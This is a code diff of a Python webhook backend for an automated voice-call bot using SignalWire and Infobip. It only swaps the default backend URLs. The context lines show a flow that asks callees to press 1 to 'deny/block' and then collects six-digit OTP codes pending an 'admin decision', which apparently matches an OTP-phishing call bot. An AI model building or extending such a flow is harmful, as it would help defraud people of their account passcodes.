@@ -59,7 +59,7 @@ async def signalwire_webhook(call_id: str, request: Request):
         step_1_message = call_data.get('step_1_message', 'Hello')
         
         # Main webhook - Play Step 1 Message
-        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         first_input_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/first-input"
         
         # Check if human/silent human detected
@@ -119,7 +119,7 @@ async def signalwire_retry_step1(call_id: str):
         
         voice = call_data.get('tts_voice', 'Aurora')
         step_1_message = call_data.get('step_1_message', 'Hello')
-        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         first_input_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/first-input"
         
         # Log retry
@@ -206,7 +206,7 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
             'event': event
         })
         
-        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         
         if Digits == '1':
             # User pressed 1 (deny/block) - Redirect to gather OTP (Step 2 Message)
@@ -252,7 +252,7 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
         
         voice = call_data.get('tts_voice', 'Aurora')
         digits_required = call_data.get('digits', 6)
-        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         step_2_message = call_data.get('step_2_message', '')
         
         # If OTP digits received
@@ -353,7 +353,7 @@ async def signalwire_wait(call_id: str):
             )
         
         voice = call_data.get('tts_voice', 'Aurora')
-        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         
         # Check if admin made decision
         admin_decision = call_data.get('admin_decision')
@@ -646,7 +646,7 @@ async def infobip_webhook(call_id: str, request: Request):
         voice_map = {'Aurora': 'Joanna', 'Chirp': 'Matthew', 'woman': 'Joanna', 'man': 'Matthew'}
         infobip_voice = voice_map.get(voice, 'Joanna')
         
-        backend_url = os.getenv('BACKEND_URL', 'https://callbot-analytics.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         first_input_url = f"{backend_url}/api/webhooks/infobip/{call_id}/first-input"
         
         response_json = {
@@ -667,7 +667,7 @@ async def infobip_first_input(call_id: str, request: Request):
         body = await request.json()
         digits = body.get('dtmf', {}).get('digits', '')
         
-        backend_url = os.getenv('BACKEND_URL', 'https://callbot-analytics.preview.emergentagent.com')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
         
         if digits == '1':
             deny_url = f"{backend_url}/api/webhooks/infobip/{call_id}/deny"
